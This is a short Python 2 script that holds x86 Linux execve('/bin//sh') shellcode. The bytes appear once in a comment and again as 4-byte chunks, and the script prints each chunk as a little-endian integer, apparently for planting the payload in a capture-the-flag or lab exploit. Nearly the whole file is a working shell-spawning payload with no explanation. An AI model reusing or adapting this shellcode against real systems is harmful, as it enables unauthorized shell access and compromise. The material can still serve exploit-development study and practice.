import struct

'''
"\x89\xE5"
"\x31\xc0"
"\x50"
"\x68\x2f\x2f\x73\x68"
"\x89\xE8"
"\x00\x00\x00\x00"
"\x31\xc0"
"\x68\x2f\x62\x69\x6e"
"\x89\xe3"
"\x90"
"\x89\xE8"
"\x00\x00\x00\x00"
"\x31\xc0"
"\x89\xc1"
"\x89\xc2"
"\xb0\x0b"
"\xcd\x80"
"\x89\xE8"
"\x00\x00\x00\x00"
"\x31\xc0"
"\x40"
"\xcd\x80"
'''


shellcode_str = [
	"\x89\xE5\x31\xc0",
	"\x50\x68\x2f\x2f",
	"\x73\x68\x89\xE8",
	"\x00\x00\x00\x00",
	"\x31\xc0\x68\x2f",
	"\x62\x69\x6e\x89",
	"\xe3\x90\x89\xE8",
	"\x00\x00\x00\x00",
	"\x31\xc0\x89\xc1",
	"\x89\xc2\xb0\x0b",
	"\xcd\x80\x89\xE8",
	"\x00\x00\x00\x00",
	"\x31\xc0\x40\xcd",
	"\x80\x90\x90\x90"
]

for index in range(len(shellcode_str)):
	print struct.unpack("<L", shellcode_str[index])[0]
